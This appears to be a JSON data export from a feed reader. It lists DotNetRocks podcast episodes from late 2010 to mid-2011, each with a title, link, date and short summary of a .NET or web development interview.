{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=664","title":"Radio Astronomy on DotNetRocks - ICRAR and SKA","published":{"$wrap":"$date","v":1305777600000,"h":"2011-05-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to professors Andreas Wicenec and Kevin Vinsen of the ICRAR and SKA project. SKA is the Square Kilometer Array for radio astronomy. The concept is to build a really huge array of radio telescopes that work together to provide far deeper resolution into space. SKA plans on a first phase of 1,000 12 meter radio telescopes. Andreas and Kevin work in the Data Intensive Research Group at the International Centre for Radio Astronomy Research in Western Australia and specialise in the research require to handle the massive amounts of data that will be generated SKA.","author":false,"_id":{"$wrap":"$oid","v":228}}
{"k":"0000000082","o":"0000000595","v":"001"}
{"_id":229,"_uid":229,"_dt":1373728933897,"_s":"62dbb360b6f07680bd6e261326f3b199"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=663","title":"Brian Lagunas on the Extended WPF Toolkit","published":{"$wrap":"$date","v":1305604800000,"h":"2011-05-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Brian Lagunas about the Extended WPF Toolkit. The Extended WPF Toolkit goes beyond Microsoft's WPF Toolkit to add even more controls for WPF. Since September 2010, Brian has been adding controls to the library, as of April 2011 he's up to 21 controls!","author":false,"_id":{"$wrap":"$oid","v":229}}
{"k":"0000000082","o":"0000000567","v":"001"}
{"_id":230,"_uid":230,"_dt":1373728933898,"_s":"3aadde7031b60e53be72f5d982655302"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=662","title":"Koen Zwikstra Spies on Silverlight","published":{"$wrap":"$date","v":1305172800000,"h":"2011-05-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Koen Zwikstra. Koen is the author of Silverlight Spy, a tool for inspecting the run time of a Silverlight application in browser, out-of-browser and even in Windows Phone 7. Think of it as Reflector or View Source for Silverlight!","author":false,"_id":{"$wrap":"$oid","v":230}}
{"k":"0000000082","o":"0000000856","v":"001"}
{"_id":231,"_uid":231,"_dt":1373728933899,"_s":"fadff819ebee12a005b43464b88c16df"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=661","title":"Glenn Block Simplifies WCF with WebAPI","published":{"$wrap":"$date","v":1305000000000,"h":"2011-05-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Richard caught up with Glenn Block at Mix 2011 to find out what he's been working on since the MEF days. After a quick tour down memory lane about MEF and Brad Abrams, Glenn discusses WCF Web APIs. The Web APIs focus WCF onto pure HTTP, making it easier to build RESTful applications while not requiring your applications to use REST. WCF Web APIs are all about creating HTTP clients and servers that do not have to be browsers and web servers, opening HTTP to a whole new world of devices and simplifying testing of your HTTP applications.","author":false,"_id":{"$wrap":"$oid","v":231}}
{"k":"0000000082","o":"0000000421","v":"001"}
{"_id":232,"_uid":232,"_dt":1373728933900,"_s":"571522a9e89fdfb3be886396279940da"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=660","title":"Chatting with the Imagine Cup Winners!","published":{"$wrap":"$date","v":1304568000000,"h":"2011-05-05T04:00:00.000Z"},"starred":false,"read":false,"content":"While Richard is climbing a mountain in Nepal, Carl talks to the US regional winners of Imagine Cup 2011.","author":false,"_id":{"$wrap":"$oid","v":232}}
{"k":"0000000082","o":"0000000678","v":"001"}
{"_id":233,"_uid":233,"_dt":1373728933901,"_s":"2db2d27bfcabc0d3834cbdd741a5a261"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=659","title":"Billy Hollis is a XAML Developer","published":{"$wrap":"$date","v":1304395200000,"h":"2011-05-03T04:00:00.000Z"},"starred":false,"read":false,"content":"While at Mix 2011, Richard talked to Billy Hollis about XAML development. Billy talks about the balance between WPF and Silverlight work, how he chooses which approach to use. The conversation also digs into steering clear of the 'One Right Way' mindset, and how right now is a great time to be ready to experiment with new technologies - XAML, touch and even gesture.","author":false,"_id":{"$wrap":"$oid","v":233}}
{"k":"0000000082","o":"0000000591","v":"001"}
{"_id":234,"_uid":234,"_dt":1373728933901,"_s":"0a1edf16ecd74c23bde4bcce95d43e39"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=658","title":"Pat Hynds Plans for Disaster Recovery","published":{"$wrap":"$date","v":1303963200000,"h":"2011-04-28T04:00:00.000Z"},"starred":false,"read":false,"content":"After getting an email from Shaun van Halewyn in Christchurch, New Zealand, Carl and Richard talk to Pat Hynds about disaster recovery for developers. This show is less about technology and more about planning - if you're responsible for your company's systems, have a listen.","author":false,"_id":{"$wrap":"$oid","v":234}}
{"k":"0000000082","o":"0000000701","v":"001"}
{"_id":235,"_uid":235,"_dt":1373728933902,"_s":"3844cef1db53b7b0cb7a1ec9f72ae926"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=657","title":"Remi Caron Connects Applications using BizTalk and the Enterprise Service Bus Toolkit","published":{"$wrap":"$date","v":1303790400000,"h":"2011-04-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Remi Caron about his project utilizing Enterprise Service Bus architecture to connect a huge number of applications together. Remi talks about using Microsoft Biztalk with the Enterprise Service Bus Toolkit to create a consistent mechanism for having different applications 'report-up' to a common infrastructure.","author":false,"_id":{"$wrap":"$oid","v":235}}
{"k":"0000000082","o":"0000000625","v":"001"}
{"_id":236,"_uid":236,"_dt":1373728933903,"_s":"488e8c11837fc7e0cef98766148618af"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=656","title":"Richard Campbell Talks Tech Ed 101","published":{"$wrap":"$date","v":1303358400000,"h":"2011-04-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl interviews Richard about Tech Ed US in Atlanta. Richard does the Tech Ed 101 sessions at the conference, in the interview he shares his secrets for how to get the most from Tech Ed. Carl and Richard also talk about their own activities at Tech Ed US, including Speaker Idol and the 64 Bit Question game show.","author":false,"_id":{"$wrap":"$oid","v":236}}
{"k":"0000000082","o":"0000000708","v":"001"}
{"_id":237,"_uid":237,"_dt":1373728933904,"_s":"b4690673451c190c03052e578f25a3b4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=655","title":"Brian Noyes is looking through Prism 4","published":{"$wrap":"$date","v":1303185600000,"h":"2011-04-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Brian Noyes about Prism 4. Prism is a combination of guidance and tooling from the Patterns and Practices team at Microsoft to help build WPF and Silverlight based applications. Brian digs into why Prism exists and what has been added to the latest version of Prism to work with Visual Studio 2010, Silverlight 4 and WPF 4. There's also a version for Windows Phone 7!","author":false,"_id":{"$wrap":"$oid","v":237}}
{"k":"0000000082","o":"0000000501","v":"001"}
{"_id":238,"_uid":238,"_dt":1373728933905,"_s":"eca3fd2ca54834057fbe8b127f82f003"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=654","title":"Dan Wahlin Digs Deep on Web Client Development","published":{"$wrap":"$date","v":1302753600000,"h":"2011-04-14T04:00:00.000Z"},"starred":false,"read":false,"content":"While at DevConnections, Carl and Richard talk to Dan Wahlin about the state of web client development. Dan talks about his experiences with Silverlight, HTML 5, MVC and jQuery.","author":false,"_id":{"$wrap":"$oid","v":238}}
{"k":"0000000082","o":"0000000622","v":"001"}
{"_id":239,"_uid":239,"_dt":1373728933905,"_s":"d2c8235e79bde57bf5c002147ef38bd8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=653","title":"Luca Passani Builds Mobile Web Pages with WURFL","published":{"$wrap":"$date","v":1302580800000,"h":"2011-04-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Luca Passani about WURFL. WURFL stands for Wireless Universal Resource File. Originally, WURFL was an XML file containing the device capabilities of a huge variety of mobile devices. Today its available in a variety of database formats, including formats friendly to .NET.","author":false,"_id":{"$wrap":"$oid","v":239}}
{"k":"0000000082","o":"0000000625","v":"001"}
{"_id":240,"_uid":240,"_dt":1373728933906,"_s":"4631e37285c382206aa5a1d4ac396490"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=652","title":"Brian Randell Does Virtual Testing Live at DevConnections!","published":{"$wrap":"$date","v":1302148800000,"h":"2011-04-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Recorded in front of the DevConnection audience in Orlando, Carl and Richard talk to Brian Randell about virtualization. Brian also digs into Virtual Lab Manager, the extensions to Visual Studio 2010 that help testers capture tests that fail and communicate them effectively to developers.","author":false,"_id":{"$wrap":"$oid","v":240}}
{"k":"0000000082","o":"0000000774","v":"001"}
{"_id":241,"_uid":241,"_dt":1373728933907,"_s":"c0d2a00de04ebe84813cca66079eff6d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=651","title":"Cory Fowler Runs PHP on Azure","published":{"$wrap":"$date","v":1301976000000,"h":"2011-04-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Cory Fowler about running PHP on Azure. Cory digs into the challenges of getting PHP up and running in Azure, especially the evil popup dialog box. Cory also points out the Microsoft Web Platform Installer Command Line edition that allows you to install anything from the WebPI onto Azure. The conversation also digs into the differences between Amazon EC2 and Microsoft Azure. Microsoft runs open source software well on Azure, check it out!","author":false,"_id":{"$wrap":"$oid","v":241}}
{"k":"0000000082","o":"0000000671","v":"001"}
{"_id":242,"_uid":242,"_dt":1373728933908,"_s":"b75dba73bfc936eaf5a4aa27f1c0fced"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=650","title":"Ayende Does Transactions with RavenDB","published":{"$wrap":"$date","v":1301544000000,"h":"2011-03-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Oren Eini, aka Ayende Rahein, about RavenDB. RavenDB is a NoSQL JSON document database. Oren explains how he came to the realization that he needed to build his own data store, and the advantages of document databases over relational databases. Is SQL dead? Not hardly, but RavenDB is an interesting addition to your data solution!","author":false,"_id":{"$wrap":"$oid","v":242}}
{"k":"0000000082","o":"0000000752","v":"001"}
{"_id":243,"_uid":243,"_dt":1373728933909,"_s":"243b006f2b88d7f13db82dd2b28870ed"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=649","title":"Eric Lippert Talks About Project Roslyn","published":{"$wrap":"$date","v":1301371200000,"h":"2011-03-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Recorded on PI day, Carl and Richard talk to the one-and-only Eric Lippert from the C# Compiler team. But we don't only talk about C#! The conversation wanders around all the languages, a little F#, a little IronPython, heck, even VB.NET! Eric talks about Project Roslyn, Microsoft's efforts to make the C# compiler available as a service. A little artificial intelligence, a little parallelism, and you've got one brain twisting show!","author":false,"_id":{"$wrap":"$oid","v":243}}
{"k":"0000000082","o":"0000000771","v":"001"}
{"_id":244,"_uid":244,"_dt":1373728933910,"_s":"61af10dcc9ebf752f7474a1addbf0b72"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=648","title":"Jean Paoli is All About Web Interoperability","published":{"$wrap":"$date","v":1300939200000,"h":"2011-03-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Jean Paoli, the General Manager of Interoperability Strategy at Microsoft. Jean Paoli was part of the team at the W3C that created the XML specification. Jean does a great job of helping us understand how huge the interoperability effort at Microsoft is. He also digs into the iterative (almost agile!) process of developing web specifications by building prototype code and taking that experience back to the working group.","author":false,"_id":{"$wrap":"$oid","v":244}}
{"k":"0000000082","o":"0000000741","v":"001"}
{"_id":245,"_uid":245,"_dt":1373728933911,"_s":"e31f5652c82ae3a769103d7a0f4cc947"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=647","title":"Adam Driscoll Does PowerShell with TFS","published":{"$wrap":"$date","v":1300766400000,"h":"2011-03-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Adam Driscoll of Quest Software. The conversation starts with a discussion around Adam's TFS plugin for Android. Then it moves into PowerGUI and the PowerGUI extensions for Visual Studio. PowerGUI is a UI for writing PowerShell scripts and PowerGUI VSX ties PowerGUI into Studio. Adam talks about applications can be built to be PowerShell driven with UI over top to generate the PowerShell commands.","author":false,"_id":{"$wrap":"$oid","v":245}}
{"k":"0000000082","o":"0000000607","v":"001"}
{"_id":246,"_uid":246,"_dt":1373728933912,"_s":"bd78a7c9666e7f12864674137f040a62"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=646","title":"Jon Snook Takes CSS3 Seriously","published":{"$wrap":"$date","v":1300334400000,"h":"2011-03-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Jonathan Snook about Cascading Style Sheets (CSS). Jon is a designer and developer, which makes him a rare creature indeed. He talks about the history and role of CSS in web development and how CSS3 makes significant strides in equalizing design and layout between browsers.","author":false,"_id":{"$wrap":"$oid","v":246}}
{"k":"0000000082","o":"0000000733","v":"001"}
{"_id":247,"_uid":247,"_dt":1373728933913,"_s":"3d6af169caf86314e27893f492401d09"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=645","title":"Scott Millett Gets Our Specs Sharp!","published":{"$wrap":"$date","v":1300161600000,"h":"2011-03-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Scott Millett about SpecFlow, a free tool to help you implement Behaviour Driven Design. SpecFlow lets you build plain text requirements that actually connect with code and tests to help reinforce acceptance testing. The conversation also wanders over design patterns in general and ASP.NET specifically. Scott also talks through the various free tools he uses together to build better software.","author":false,"_id":{"$wrap":"$oid","v":247}}
{"k":"0000000082","o":"0000000808","v":"001"}
{"_id":248,"_uid":248,"_dt":1373728933913,"_s":"a64189b1645875d29a71d288efdac030"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=644","title":"Kent Alstad Makes Javascript Perform","published":{"$wrap":"$date","v":1299729600000,"h":"2011-03-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Kent Alstad about the state of Javascript today. Kent admits that he has fallen in love with Javascript of late, that the newest browsers make Javascript incredibly fast and powerful. The conversation digs into how to keep Javascript fast, which is primarily focused on downloading the right bytes at the right time - when in doubt, delay! Kent is down in the nitty gritty of web site performance, his insight on what to do to make things go faster will blow your mind.","author":false,"_id":{"$wrap":"$oid","v":248}}
{"k":"0000000082","o":"0000000676","v":"001"}
{"_id":249,"_uid":249,"_dt":1373728933914,"_s":"b54cc6389e0e2392f309bb42e2905bee"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=643","title":"Mark Miller and Seth Juarez Go Mad with Kinect!","published":{"$wrap":"$date","v":1299556800000,"h":"2011-03-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Mark Miller and Seth Juarez about their crazy experiments with Kinect. The boys discuss how they are building an interface with Kinect to do programming with Visual Studio 2010. A large part of this conversation ends up diving deep into the relative merits of machine learning in systems. Are we crossing the streams? You bet!","author":false,"_id":{"$wrap":"$oid","v":249}}
{"k":"0000000082","o":"0000000765","v":"001"}
{"_id":250,"_uid":250,"_dt":1373728933915,"_s":"875fcbdf4e1a20b20114f07f35ed6ca5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=642","title":"Bruce Lawson and Remy Sharp on HTML 5","published":{"$wrap":"$date","v":1299124800000,"h":"2011-03-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Bruce Lawson and Remi Sharp about HTML 5. Bruce and Remy have been involved with HTML 5 from the early days, although more as activists than movers-and-shakers. They provide some great insight into how HTML 5 has come to be and how regular developers can get involved and affect the outcome of an important specification. Bruce and Remy have one of the very first books out on HTML 5, creatively named Introduction to HTML 5.","author":false,"_id":{"$wrap":"$oid","v":250}}
{"k":"0000000082","o":"0000000679","v":"001"}
{"_id":251,"_uid":251,"_dt":1373728933916,"_s":"8f0204b83660cd77702b8b5316b5fb3a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=641","title":"Giorgio Sardo on the IE9 Release Candidate","published":{"$wrap":"$date","v":1298865600000,"h":"2011-02-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Giorgio Sardo about the IE9 Release Candidate. Giorgio talks about his experience with Imagine Cup a few years back before diving into what's new in IE9. These features include geolocation and Web Open Font Format. Giorgio also digs into the test strategies of IE9 as well as performance. When will IE9 be released? Giorgio won't say!","author":false,"_id":{"$wrap":"$oid","v":251}}
{"k":"0000000082","o":"0000000776","v":"001"}
{"_id":252,"_uid":252,"_dt":1373728933917,"_s":"f1357399b666f0efebd45b17a590ec51"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=640","title":"Gael Fraiteur is Still PostSharp!","published":{"$wrap":"$date","v":1298520000000,"h":"2011-02-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Gael Fraiteur about the state of PostSharp and Aspect Oriented Programming (AOP). Gael talks about the advantage of AOP, modifying applications without changing source code by using post-compilation techniques. He digs into different examples of using AOP to add features without burying business code in the plumbing. Finally Gael talks about the evolution of PostSharp into community and retail versions and what is coming in version 2.1.","author":false,"_id":{"$wrap":"$oid","v":252}}
{"k":"0000000082","o":"0000000805","v":"001"}
{"_id":253,"_uid":253,"_dt":1373728933918,"_s":"c7dedbeb76b12149e0e1b3b2ba57be7b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=639","title":"Udi Dahan Clarifies CQRS","published":{"$wrap":"$date","v":1298347200000,"h":"2011-02-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Udi Dahan about Command-Query Responsibility Segregation (CQRS). CQRS is an enterprise application pattern derived from the DDD movement, where responsibility for data integrity and consistency lies soley in the application itself. The conversation digs deeply into using caching intelligently - not just create and expire, but actual maintenance of caching with a publication approach. Udi is the software simplist and makes this potentially confusing pattern absolutely clear!","author":false,"_id":{"$wrap":"$oid","v":253}}
{"k":"0000000082","o":"0000000615","v":"001"}
{"_id":254,"_uid":254,"_dt":1373728933919,"_s":"351509245d199b09d8121f78213cde5a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=638","title":"Rob Eisenberg MVVMs Us with Caliburn.Micro!","published":{"$wrap":"$date","v":1297915200000,"h":"2011-02-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Rob Eisenberg about Caliburn.Micro, a MVVM framework available on Codeplex. Caliburn.Micro takes Convention-over-Configuration further, utilizing naming conventions to handle a large number of data binding, validation and other action-based characteristics in your app.","author":false,"_id":{"$wrap":"$oid","v":254}}
{"k":"0000000082","o":"0000000765","v":"001"}
{"_id":255,"_uid":255,"_dt":1373728933919,"_s":"94e7f416df65302987823dae97fe6d1e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=637","title":"Entering the WebMatrix!","published":{"$wrap":"$date","v":1297742400000,"h":"2011-02-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Josh Holmes about Microsoft's Web Matrix! Josh keynoted the launch of WebMatrix at CodeMash in January 2011. Web Matrix brings together great installer technologies with some of the latest Microsoft web application technologies to make it dirt simple to deploy and maintain web sites. The tool is free and the projects you make can be maintained with Studio Express or full blown Visual Studio. Enter the WebMatrix! You'll be glad you did.","author":false,"_id":{"$wrap":"$oid","v":255}}
{"k":"0000000082","o":"0000000577","v":"001"}
{"_id":256,"_uid":256,"_dt":1373728933920,"_s":"d7670c20b8785a2e1cf86a61759e1c1d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=636","title":"Joe O'Brien Does Ruby on Windows","published":{"$wrap":"$date","v":1297310400000,"h":"2011-02-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Joe O'Brien about efforts to bring Ruby on Rails to the Windows platform. The conversation digs into current community efforts to get Ruby on Rails working on Windows, the state of IronRuby and the role that Visual Studio could bring to Ruby.","author":false,"_id":{"$wrap":"$oid","v":256}}
{"k":"0000000082","o":"0000000550","v":"001"}
{"_id":257,"_uid":257,"_dt":1373728933921,"_s":"1d2a2c8cd4d6246cea3df553513aa409"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=635","title":"Andrew Russell Develops XNA Games for XBox, iPhone and More!","published":{"$wrap":"$date","v":1297137600000,"h":"2011-02-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Andrew Russell about converting applications from XNA to Silverlight, iPhone and even Android. Andrew is working on a project called ExEn to make migration between these platforms easier.","author":false,"_id":{"$wrap":"$oid","v":257}}
{"k":"0000000082","o":"0000000690","v":"001"}
{"_id":258,"_uid":258,"_dt":1373728933922,"_s":"c6032ed9da1952803dbdb99e5aca32c1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=634","title":"Andrew Parsons and Alfred Thompson Educate Kids in Software!","published":{"$wrap":"$date","v":1296705600000,"h":"2011-02-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Andrew Parsons and Alfred Thompson about getting students interested in programming. The conversation spans over use of computers in schools, teaching fundamental uses of computers, actual programming, and looking beyond. Andrew gets into Imagine Cup, a world-wide competition of students building software to change the world.","author":false,"_id":{"$wrap":"$oid","v":258}}
{"k":"0000000082","o":"0000000621","v":"001"}
{"_id":259,"_uid":259,"_dt":1373728933922,"_s":"3485ef7d1708833ac153feea2b6d36b0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=633","title":"Grant Skinner Develops Apps in HTML 5","published":{"$wrap":"$date","v":1296532800000,"h":"2011-02-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Grant Skinner about Pirates Love Daisies, an HTML 5 game. The game runs on all of the HTML 5 browsers including IE 9 Beta. The conversation also digs into Easel JS, an open-source library that Grant helped create to make Pirates, simplifying the animation process on HTML 5 canvas.","author":false,"_id":{"$wrap":"$oid","v":259}}
{"k":"0000000082","o":"0000000625","v":"001"}
{"_id":260,"_uid":260,"_dt":1373728933923,"_s":"c171f8789144b177b632f8916f6d586c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=632","title":"Doc Norton Sharpens His Saw","published":{"$wrap":"$date","v":1296100800000,"h":"2011-01-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Michael Doc Norton about how developers can grow their career. The conversation dives deep into techniques and approaches to practice in development, comparing it to music and katas. The reference sharpen the saw comes from Stephen Covey, and focuses on the idea of practice independent of work.","author":false,"_id":{"$wrap":"$oid","v":260}}
{"k":"0000000082","o":"0000000594","v":"001"}
{"_id":261,"_uid":261,"_dt":1373728933924,"_s":"86c1761ae05aafa647308679d766040d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=631","title":"Stephen Toub is more Parallel than Ever","published":{"$wrap":"$date","v":1295928000000,"h":"2011-01-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Stephen Toub from Microsoft about parallel development. Stephen digs into the Async-CTP, released in October 2010, to provide asynchronous keywords Async and Await. The conversation also digs into what's coming next in the parallel space from the team.","author":false,"_id":{"$wrap":"$oid","v":261}}
{"k":"0000000082","o":"0000000711","v":"001"}
{"_id":262,"_uid":262,"_dt":1373728933925,"_s":"e64ce182e6fa1f5e3933874126d42870"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=630","title":"DotNetRocks and JavaPosse Together at CodeMash","published":{"$wrap":"$date","v":1295496000000,"h":"2011-01-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard participated in a panel discussion at Codemash 2011 on January 12, 2011 alongside the hosts of the popular Java Posse podcast. The discussion was moderated by Barry Hawkins. They talked about the differences and similarities between the Java and .NET ecosystems, the origins of their podcast (and ours), and more. Even if you're not a Java developer this is great stuff.","author":false,"_id":{"$wrap":"$oid","v":262}}
{"k":"0000000082","o":"0000000641","v":"001"}
{"_id":263,"_uid":263,"_dt":1373728933926,"_s":"e0f12caf4c823d64b28e7c85e848f6f3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=629","title":"Joel Semeniuk does TFS in the Cloud","published":{"$wrap":"$date","v":1295323200000,"h":"2011-01-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Joel Semeniuk about the state of Team Foundation Server (TFS) today. Joel digs into how TFS has moved into the cloud and is reaching a larger span of developers. The conversation digs into how to split the work of development up between cloud and premise - source code on the cloud, builds locally, etc.","author":false,"_id":{"$wrap":"$oid","v":263}}
{"k":"0000000082","o":"0000000564","v":"001"}
{"_id":264,"_uid":264,"_dt":1373728933927,"_s":"9386f04cbde9c0c875ea3a49de97d50e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=628","title":"Phil Japikse is All About BDD","published":{"$wrap":"$date","v":1294891200000,"h":"2011-01-13T04:00:00.000Z"},"starred":false,"read":false,"content":"While at CodeMash, Carl and Richard talk to Phil Japikse about Behaviour Driven Developement. Phil has been doing TDD and BDD for years and has an interesting take on how to be successful with the process - primarily getting over the 'blank slate syndrome.'","author":false,"_id":{"$wrap":"$oid","v":264}}
{"k":"0000000082","o":"0000000588","v":"001"}
{"_id":265,"_uid":265,"_dt":1373728933928,"_s":"3cec2144456829a8456d02938f4eba72"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=627","title":"Boris Scheiman Waves His Hands at nKinect!","published":{"$wrap":"$date","v":1294718400000,"h":"2011-01-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Boris Scheiman about nKinect, a codeplex project to bring Kinect to .NET! Boris talks about what it takes to make nKinect work and the new features that are coming, while Carl and Richard geek out on the possibilities. Minority Report is here!","author":false,"_id":{"$wrap":"$oid","v":265}}
{"k":"0000000082","o":"0000000594","v":"001"}
{"_id":266,"_uid":266,"_dt":1373728933929,"_s":"508389f36652851bca3d517a0c292132"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=626","title":"Rob Conery Talks OpenID and More","published":{"$wrap":"$date","v":1294286400000,"h":"2011-01-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Rob Conery tells us why OpenID is a nightmare, and why he's stopped using it. Oh yeah, he's also given up Twitter. We also talked about the mind/body connection and the challenges of working at home. Also: whale watching, home brewing, music, barbeque, wine, and following your bliss.","author":false,"_id":{"$wrap":"$oid","v":266}}
{"k":"0000000082","o":"0000000554","v":"001"}
{"_id":267,"_uid":267,"_dt":1373728933930,"_s":"1ae8b450f919c95fee06f47e53bb6087"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=625","title":"Gus Issa Has a Micro .NET Framework!","published":{"$wrap":"$date","v":1294113600000,"h":"2011-01-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Gus Issa from GHI Electronics, a company that makes small programmable boards, devices, controllers, and sensors that use the .NET Micro Framework to allow Visual Studio developers to program smart hardware devices.","author":false,"_id":{"$wrap":"$oid","v":267}}
{"k":"0000000082","o":"0000000485","v":"001"}
{"_id":268,"_uid":268,"_dt":1373728933931,"_s":"81590572ea81cc8cb4eaf39efbc2ec3b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=624","title":"DotNetRocks Year In Review","published":{"$wrap":"$date","v":1293681600000,"h":"2010-12-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl, Richard and Mark Miller chat about events that occurred in 2010 that affect the .NET world. From C# to F#, Studio to Lightswitch, Windows Phone 7 to Kinect. What a great year!","author":false,"_id":{"$wrap":"$oid","v":268}}
{"k":"0000000082","o":"0000000666","v":"001"}
{"_id":269,"_uid":269,"_dt":1373728933931,"_s":"5191f3752f20864e962dc04749d7b977"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=623","title":"Shaun Walker on the state of DotNetNuke","published":{"$wrap":"$date","v":1293508800000,"h":"2010-12-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Shaun Walker, CTO of DotNetNuke Corp. Last time Shaun was on the show, the commercial version of DotNetNuke was just starting out. Shaun brings us up to date on the state of the business, the balance between community and commercial, and the evolution of the store front for the thousands of plug-in products for DotNetNuke.","author":false,"_id":{"$wrap":"$oid","v":269}}
